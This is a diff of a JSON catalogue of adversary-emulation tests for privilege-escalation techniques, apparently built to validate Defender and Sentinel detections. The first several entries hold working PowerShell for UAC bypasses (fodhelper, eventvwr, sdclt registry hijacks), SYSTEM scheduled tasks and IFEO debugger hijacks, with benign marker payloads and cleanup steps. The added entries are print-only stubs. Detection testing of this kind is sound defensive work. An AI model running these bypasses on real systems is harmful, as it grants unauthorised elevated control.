@@ -22,7 +22,11 @@
       "label": "Common Privilege Escalation Settings",
       "description": "Shared staging directory for privesc artefacts. Used by T1548 UAC bypass to place the marker file written by the elevated process.",
       "scope": "local",
-      "used_by_tcodes": ["T1548", "T1053", "T1546"],
+      "used_by_tcodes": [
+        "T1548",
+        "T1053",
+        "T1546"
+      ],
       "tags": [
         {
           "key": "excalibur_pe_staging_dir",
@@ -46,7 +50,9 @@
       "technique_name": "Abuse Elevation Control Mechanism",
       "executor": "powershell",
       "platform": "windows",
-      "required_tags": ["excalibur_pe_staging_dir"],
+      "required_tags": [
+        "excalibur_pe_staging_dir"
+      ],
       "command": "Write-Host '[START] T1548.002 - UAC Bypass via fodhelper.exe (ms-settings registry hijack)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; $markerFile = Join-Path $stagingDir 'uac-bypass-fodhelper-success.txt'; $regKeyPath = 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'; $delegateValueName = 'DelegateExecute'; $cmdPayload = 'cmd.exe /c echo MorganaUACBypassT1548-fodhelper-HIGH-INTEGRITY > \"' + $markerFile + '\"'; Write-Host ('[INFO] UAC bypass method: fodhelper.exe ms-settings registry hijack'); Write-Host ('[INFO] Target registry key: ' + $regKeyPath); Write-Host ('[INFO] Payload (benign marker file write): ' + $cmdPayload); Write-Host '[INFO] Step 1/4: Create HKCU ms-settings registry path'; try { New-Item -Path $regKeyPath -Force -ErrorAction Stop | Out-Null; Write-Host ('[INFO] Registry path created: ' + $regKeyPath + ' (MDE: suspicious HKCU\\Classes\\ms-settings registry creation)') } catch { Write-Host ('[WARN] Registry create: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 2/4: Write DelegateExecute (empty - required by fodhelper)'; try { Set-ItemProperty -Path $regKeyPath -Name $delegateValueName -Value '' -ErrorAction Stop; Write-Host ('[INFO] DelegateExecute set (empty value - required for fodhelper to read the key)') } catch { Write-Host ('[WARN] DelegateExecute: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 3/4: Write payload as default value + launch fodhelper.exe'; try { Set-ItemProperty -Path $regKeyPath -Name '(default)' -Value $cmdPayload -ErrorAction Stop; Write-Host ('[INFO] Payload written to registry default value'); Write-Host '[INFO] Launching fodhelper.exe (will execute payload as HIGH INTEGRITY without UAC prompt)...'; $proc = Start-Process -FilePath 'C:\\Windows\\System32\\fodhelper.exe' -PassThru -ErrorAction Stop; Start-Sleep 2; $proc | Stop-Process -ErrorAction SilentlyContinue; $elevated = Test-Path $markerFile; Write-Host ('[INFO] fodhelper launched (PID: ' + $proc.Id + ') | Marker file written by elevated process: ' + $elevated) } catch { Write-Host ('[WARN] fodhelper launch: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 4/4: Cleanup - remove registry key immediately'; try { Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force -ErrorAction SilentlyContinue; Write-Host '[INFO] Registry key removed (cleanup)' } catch {}; if (Test-Path $markerFile) { Write-Host ('[SUCCESS] UAC BYPASS CONFIRMED - marker file written by HIGH INTEGRITY process: ' + $markerFile) } else { Write-Host '[INFO] Marker file not written (MDE may have blocked fodhelper execution, or UAC is set to Always Notify)' }; Write-Host '[SUCCESS] T1548 - fodhelper UAC bypass simulation completed. Sentinel target: HKCU\\Classes\\ms-settings\\shell\\open\\command write + fodhelper.exe launch (MDE - UAC bypass behavioral detection - high confidence)'",
       "cleanup_command": "Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force -ErrorAction SilentlyContinue; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1548 fodhelper cleanup: registry key and staging dir removed'",
       "detection_rule": "HKCU\\Classes\\ms-settings\\shell\\open\\command write + fodhelper.exe launch (UAC bypass - high confidence MDE signal)",
@@ -62,7 +68,9 @@
       "technique_name": "Abuse Elevation Control Mechanism",
       "executor": "powershell",
       "platform": "windows",
-      "required_tags": ["excalibur_pe_staging_dir"],
+      "required_tags": [
+        "excalibur_pe_staging_dir"
+      ],
       "command": "Write-Host '[START] T1548.002 - UAC Bypass via eventvwr.exe + sdclt.exe (mscfile/exefile registry hijack)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; Write-Host '[INFO] Method 1/2: eventvwr.exe UAC bypass (HKCU mscfile shell hijack)'; $eventvwrKey = 'HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command'; $markerEvt = Join-Path $stagingDir 'uac-bypass-eventvwr-success.txt'; $payloadEvt = 'cmd.exe /c echo MorganaUACBypassT1548-eventvwr > \"' + $markerEvt + '\"'; try { New-Item -Path $eventvwrKey -Force -ErrorAction Stop | Out-Null; Set-ItemProperty -Path $eventvwrKey -Name '(default)' -Value $payloadEvt -ErrorAction Stop; Write-Host ('[INFO] HKCU mscfile shell key written: ' + $eventvwrKey + ' (MDE: suspicious file association hijack in HKCU)'); $evtProc = Start-Process -FilePath 'C:\\Windows\\System32\\eventvwr.exe' -PassThru -ErrorAction Stop; Start-Sleep 2; $evtProc | Stop-Process -ErrorAction SilentlyContinue; $evtOk = Test-Path $markerEvt; Write-Host ('[INFO] eventvwr.exe launched (PID: ' + $evtProc.Id + ') | Bypass confirmed: ' + $evtOk); Remove-Item -Path 'HKCU:\\Software\\Classes\\mscfile' -Recurse -Force -ErrorAction SilentlyContinue; Write-Host '[INFO] HKCU mscfile key cleaned' } catch { Write-Host ('[INFO] eventvwr bypass: ' + $_.Exception.Message) }; Write-Host '[INFO] Method 2/2: sdclt.exe UAC bypass (HKCU exefile runas command hijack - Windows 10 1703+)'; $sdcltKey = 'HKCU:\\Software\\Classes\\exefile\\shell\\runas\\command'; $markerSdc = Join-Path $stagingDir 'uac-bypass-sdclt-success.txt'; $payloadSdc = 'cmd.exe /c echo MorganaUACBypassT1548-sdclt > \"' + $markerSdc + '\"'; try { New-Item -Path $sdcltKey -Force -ErrorAction Stop | Out-Null; Set-ItemProperty -Path $sdcltKey -Name '(default)' -Value $payloadSdc -ErrorAction Stop; Set-ItemProperty -Path $sdcltKey -Name 'IsolatedCommand' -Value $payloadSdc -ErrorAction SilentlyContinue; Write-Host ('[INFO] HKCU exefile\\runas key written: ' + $sdcltKey + ' (MDE: exefile runas command hijack)'); $sdcltProc = Start-Process -FilePath 'C:\\Windows\\System32\\sdclt.exe' -ArgumentList '/kickoffelev' -PassThru -ErrorAction Stop; Start-Sleep 2; $sdcltProc | Stop-Process -ErrorAction SilentlyContinue; $sdcOk = Test-Path $markerSdc; Write-Host ('[INFO] sdclt.exe launched (PID: ' + $sdcltProc.Id + ') | Bypass confirmed: ' + $sdcOk); Remove-Item -Path 'HKCU:\\Software\\Classes\\exefile' -Recurse -Force -ErrorAction SilentlyContinue; Write-Host '[INFO] HKCU exefile key cleaned' } catch { Write-Host ('[INFO] sdclt bypass: ' + $_.Exception.Message) }; Write-Host '[SUCCESS] T1548 - eventvwr/sdclt UAC bypass simulation completed. Sentinel target: HKCU mscfile/exefile shell command hijack + eventvwr.exe/sdclt.exe launch (MDE - UAC bypass behavioral detection)'",
       "cleanup_command": "Remove-Item -Path 'HKCU:\\Software\\Classes\\mscfile' -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -Path 'HKCU:\\Software\\Classes\\exefile' -Recurse -Force -ErrorAction SilentlyContinue; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1548 eventvwr/sdclt cleanup: registry keys and staging dir removed'",
       "detection_rule": "HKCU\\Classes\\mscfile/exefile shell command hijack + eventvwr.exe/sdclt.exe launch (UAC bypass pattern)",
@@ -94,7 +102,9 @@
       "technique_name": "Scheduled Task/Job",
       "executor": "powershell",
       "platform": "windows",
-      "required_tags": ["excalibur_pe_staging_dir"],
+      "required_tags": [
+        "excalibur_pe_staging_dir"
+      ],
       "command": "Write-Host '[START] T1053.005 - Scheduled Task as SYSTEM (privilege escalation via schtasks /ru SYSTEM)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; $taskName = 'MorganaPrivEscSimT1053'; $outputFile = Join-Path $stagingDir 'schtask-system-output.txt'; $taskCmd = '/c whoami /all > \"' + $outputFile + '\" 2>&1'; Write-Host '[INFO] Method 1/2: schtasks.exe /ru SYSTEM (LOLBin - classic privesc method)'; try { $createResult = & schtasks.exe /create /tn $taskName /sc once /st 00:00 /ru SYSTEM /tr ('cmd.exe ' + $taskCmd) /f 2>&1; Write-Host ('[INFO] schtasks /create /ru SYSTEM: ' + ($createResult -join ' ').Trim()); if ($createResult -match 'SUCCESS|created') { Write-Host '[INFO] Running task immediately...'; $runResult = & schtasks.exe /run /tn $taskName 2>&1; Write-Host ('[INFO] schtasks /run: ' + ($runResult -join ' ').Trim()); Start-Sleep 3; if (Test-Path $outputFile) { $taskOutput = Get-Content $outputFile -ErrorAction SilentlyContinue; $runningAs = $taskOutput | Where-Object { $_ -match 'USER NAME|NT AUTHORITY\\SYSTEM' } | Select-Object -First 1; Write-Host ('[SUCCESS] Task ran as: ' + $runningAs.Trim()); Write-Host ('[INFO] Privileges in SYSTEM context:'); $taskOutput | Where-Object { $_ -match 'Enabled|Disabled' } | Select-Object -First 10 | ForEach-Object { Write-Host ('    ' + $_.Trim()) } } else { Write-Host '[INFO] Output file not written (admin required for SYSTEM tasks - access denied expected)' }; $delResult = & schtasks.exe /delete /tn $taskName /f 2>&1; Write-Host ('[INFO] Task deleted: ' + ($delResult -join ' ').Trim()) } else { Write-Host '[INFO] SYSTEM task creation: access denied (Administrator required for /ru SYSTEM)' } } catch { Write-Host ('[INFO] schtasks SYSTEM: ' + $_.Exception.Message) }; Write-Host '[INFO] Method 2/2: PowerShell New-ScheduledTask API with SYSTEM principal'; $taskName2 = 'MorganaPrivEscSimT1053-PS'; try { $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument ('/c whoami /all > \"' + $outputFile + '.ps1.txt\" 2>&1'); $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10); $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -RunLevel Highest -LogonType ServiceAccount; $settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 1); Register-ScheduledTask -TaskName $taskName2 -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null; Write-Host ('[INFO] PS API SYSTEM task registered: ' + $taskName2 + ' | MDE: scheduled task with SYSTEM principal creation'); Start-Sleep 12; $psOutput = if (Test-Path ($outputFile + '.ps1.txt')) { Get-Content ($outputFile + '.ps1.txt') | Where-Object { $_ -match 'USER NAME' } | Select-Object -First 1 } else { 'output not found' }; Write-Host ('[INFO] PS SYSTEM task ran as: ' + $psOutput); Unregister-ScheduledTask -TaskName $taskName2 -Confirm:$false -ErrorAction SilentlyContinue; Write-Host ('[INFO] PS task unregistered') } catch { Write-Host ('[INFO] PS SYSTEM task: ' + $_.Exception.Message.Split([char]10)[0]) }; Write-Host '[SUCCESS] T1053 - Scheduled task SYSTEM simulation completed. Sentinel target: schtasks /create /ru SYSTEM + New-ScheduledTask SYSTEM principal (MDE - privilege escalation via scheduled task behavioral detection)'",
       "cleanup_command": "schtasks.exe /delete /tn 'MorganaPrivEscSimT1053' /f 2>&1 | Out-Null; Unregister-ScheduledTask -TaskName 'MorganaPrivEscSimT1053-PS' -Confirm:$false -ErrorAction SilentlyContinue; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1053 cleanup: tasks deleted, staging dir removed'",
       "detection_rule": "schtasks /create /ru SYSTEM + New-ScheduledTask with SYSTEM principal (scheduled task privilege escalation)",
@@ -142,7 +152,9 @@
       "technique_name": "Event Triggered Execution",
       "executor": "powershell",
       "platform": "windows",
-      "required_tags": ["excalibur_pe_staging_dir"],
+      "required_tags": [
+        "excalibur_pe_staging_dir"
+      ],
       "command": "Write-Host '[START] T1546.012 - IFEO Debugger Hijack (Image File Execution Options)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; $ifeoBase = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options'; $targetExe = 'notepad.exe'; $ifeoTarget = Join-Path $ifeoBase $targetExe; $markerFile = Join-Path $stagingDir 'ifeo-hijack-marker.txt'; $debuggerPayload = 'cmd.exe /c echo MorganaIFEOHijackT1546 > \"' + $markerFile + '\"'; Write-Host ('[INFO] Target IFEO key: ' + $ifeoTarget); Write-Host ('[INFO] Debugger payload: ' + $debuggerPayload); Write-Host '[INFO] Method 1/2: HKLM IFEO Debugger write (admin required - access denied expected, attempt logged)'; try { if (-not (Test-Path $ifeoTarget)) { New-Item -Path $ifeoTarget -Force -ErrorAction Stop | Out-Null } ; Set-ItemProperty -Path $ifeoTarget -Name 'Debugger' -Value $debuggerPayload -ErrorAction Stop; Write-Host ('[WARN] HKLM IFEO Debugger set on ' + $targetExe + ': ' + $debuggerPayload + ' (MDE: IFEO Debugger write - high confidence persistence/privesc indicator)'); Start-Sleep 1; Remove-ItemProperty -Path $ifeoTarget -Name 'Debugger' -ErrorAction SilentlyContinue; $empty = @(Get-Item $ifeoTarget -ErrorAction SilentlyContinue).Property; if (@($empty).Count -eq 0) { Remove-Item -Path $ifeoTarget -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] HKLM IFEO key cleaned immediately' } catch { Write-Host ('[INFO] HKLM IFEO write: ' + $_.Exception.Message.Split([char]10)[0] + ' (access denied - admin required for HKLM - attempt was logged by MDE)') }; Write-Host '[INFO] Method 2/2: IFEO GlobalFlag variant (silent process exit monitoring - used for advanced persistence)'; $silentProc = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit'; Write-Host ('[INFO] SilentProcessExit path: ' + $silentProc); try { $spxExists = Test-Path $silentProc; Write-Host ('[INFO] SilentProcessExit key exists: ' + $spxExists + ' (adversaries write to this to trigger process on target process exit)'); $gfPayload = Join-Path $ifeoBase ($targetExe + '-gf'); if (-not (Test-Path $gfPayload)) { New-Item -Path $gfPayload -Force -ErrorAction Stop | Out-Null }; Set-ItemProperty -Path $gfPayload -Name 'GlobalFlag' -Value 0x200 -ErrorAction Stop; Write-Host ('[INFO] GlobalFlag 0x200 (FLG_MONITOR_SILENT_PROCESS_EXIT) set on ' + $targetExe + ' (MDE: IFEO GlobalFlag persistence)'); Remove-Item -Path $gfPayload -Force -ErrorAction SilentlyContinue; Write-Host '[INFO] GlobalFlag key cleaned' } catch { Write-Host ('[INFO] GlobalFlag: ' + $_.Exception.Message.Split([char]10)[0]) }; Write-Host '[SUCCESS] T1546 - IFEO debugger hijack simulation completed. Sentinel target: HKLM IFEO Debugger key write + GlobalFlag modification (MDE - IFEO hijack persistence/privesc behavioral detection)'",
       "cleanup_command": "$ifeoTarget = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe'; Remove-ItemProperty -Path $ifeoTarget -Name 'Debugger' -ErrorAction SilentlyContinue; Remove-Item -Path ($ifeoTarget + '-gf') -Force -ErrorAction SilentlyContinue; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_pe_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1546 cleanup: IFEO keys and staging dir removed'",
       "detection_rule": "HKLM IFEO Debugger key write + GlobalFlag modification on target executable (IFEO hijack)",
@@ -196,6 +208,822 @@
       "detection_rule": "Docker socket + Hyper-V guest registry + VMBus pipe access from non-VM-management process (escape to host recon)",
       "sentinel_connector": "Microsoft Defender for Endpoint",
       "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1055.011-Extra Window Memory Injection",
+      "name": "Excalibur - Privilege Escalation-T1055.011-Extra Window Memory Injection",
+      "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1055.011",
+      "technique_name": "Extra Window Memory Injection",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1055.011 - Extra Window Memory Injection'; Write-Host '[INFO] Emulating T1055.011 (Extra Window Memory Injection) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1055.011 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1055.011 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Extra Window Memory Injection (T1055.011)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1053.005-Scheduled Task",
+      "name": "Excalibur - Privilege Escalation-T1053.005-Scheduled Task",
+      "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1053.005",
+      "technique_name": "Scheduled Task",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1053.005 - Scheduled Task'; Write-Host '[INFO] Emulating T1053.005 (Scheduled Task) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1053.005 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1053.005 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Scheduled Task (T1053.005)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1546.013-PowerShell Profile",
+      "name": "Excalibur - Privilege Escalation-T1546.013-PowerShell Profile",
+      "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1546.013",
+      "technique_name": "PowerShell Profile",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1546.013 - PowerShell Profile'; Write-Host '[INFO] Emulating T1546.013 (PowerShell Profile) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1546.013 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1546.013 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect PowerShell Profile (T1546.013)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1548.002-Bypass User Account Control",
+      "name": "Excalibur - Privilege Escalation-T1548.002-Bypass User Account Control",
+      "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1548.002",
+      "technique_name": "Bypass User Account Control",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1548.002 - Bypass User Account Control'; Write-Host '[INFO] Emulating T1548.002 (Bypass User Account Control) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1548.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1548.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Bypass User Account Control (T1548.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1547.014-Active Setup",
+      "name": "Excalibur - Privilege Escalation-T1547.014-Active Setup",
+      "description": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1547.014",
+      "technique_name": "Active Setup",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1547.014 - Active Setup'; Write-Host '[INFO] Emulating T1547.014 (Active Setup) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1547.014 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1547.014 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Active Setup (T1547.014)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1484.002-Trust Modification",
+      "name": "Excalibur - Privilege Escalation-T1484.002-Trust Modification",
+      "description": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities ar...",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1484.002",
+      "technique_name": "Trust Modification",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1484.002 - Trust Modification'; Write-Host '[INFO] Emulating T1484.002 (Trust Modification) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1484.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1484.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Trust Modification (T1484.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1543.003-Windows Service",
+      "name": "Excalibur - Privilege Escalation-T1543.003-Windows Service",
+      "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1543.003",
+      "technique_name": "Windows Service",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1543.003 - Windows Service'; Write-Host '[INFO] Emulating T1543.003 (Windows Service) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1543.003 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1543.003 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Windows Service (T1543.003)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1547.012-Print Processors",
+      "name": "Excalibur - Privilege Escalation-T1547.012-Print Processors",
+      "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1547.012",
+      "technique_name": "Print Processors",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1547.012 - Print Processors'; Write-Host '[INFO] Emulating T1547.012 (Print Processors) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1547.012 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1547.012 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Print Processors (T1547.012)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1098.007-Additional Local or Domain Groups",
+      "name": "Excalibur - Privilege Escalation-T1098.007-Additional Local or Domain Groups",
+      "description": "An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1098.007",
+      "technique_name": "Additional Local or Domain Groups",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1098.007 - Additional Local or Domain Groups'; Write-Host '[INFO] Emulating T1098.007 (Additional Local or Domain Groups) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1098.007 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1098.007 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Additional Local or Domain Groups (T1098.007)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1055.003-Thread Execution Hijacking",
+      "name": "Excalibur - Privilege Escalation-T1055.003-Thread Execution Hijacking",
+      "description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1055.003",
+      "technique_name": "Thread Execution Hijacking",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1055.003 - Thread Execution Hijacking'; Write-Host '[INFO] Emulating T1055.003 (Thread Execution Hijacking) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1055.003 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1055.003 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Thread Execution Hijacking (T1055.003)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1546.011-Application Shimming",
+      "name": "Excalibur - Privilege Escalation-T1546.011-Application Shimming",
+      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1546.011",
+      "technique_name": "Application Shimming",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1546.011 - Application Shimming'; Write-Host '[INFO] Emulating T1546.011 (Application Shimming) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1546.011 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1546.011 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Application Shimming (T1546.011)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1547.010-Port Monitors",
+      "name": "Excalibur - Privilege Escalation-T1547.010-Port Monitors",
+      "description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1547.010",
+      "technique_name": "Port Monitors",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1547.010 - Port Monitors'; Write-Host '[INFO] Emulating T1547.010 (Port Monitors) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1547.010 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1547.010 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Port Monitors (T1547.010)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1547.009-Shortcut Modification",
+      "name": "Excalibur - Privilege Escalation-T1547.009-Shortcut Modification",
+      "description": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1547.009",
+      "technique_name": "Shortcut Modification",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1547.009 - Shortcut Modification'; Write-Host '[INFO] Emulating T1547.009 (Shortcut Modification) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1547.009 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1547.009 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Shortcut Modification (T1547.009)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1547.005-Security Support Provider",
+      "name": "Excalibur - Privilege Escalation-T1547.005-Security Support Provider",
+      "description": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1547.005",
+      "technique_name": "Security Support Provider",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1547.005 - Security Support Provider'; Write-Host '[INFO] Emulating T1547.005 (Security Support Provider) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1547.005 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1547.005 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Security Support Provider (T1547.005)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1484.001-Group Policy Modification",
+      "name": "Excalibur - Privilege Escalation-T1484.001-Group Policy Modification",
+      "description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1484.001",
+      "technique_name": "Group Policy Modification",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1484.001 - Group Policy Modification'; Write-Host '[INFO] Emulating T1484.001 (Group Policy Modification) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1484.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1484.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Group Policy Modification (T1484.001)",
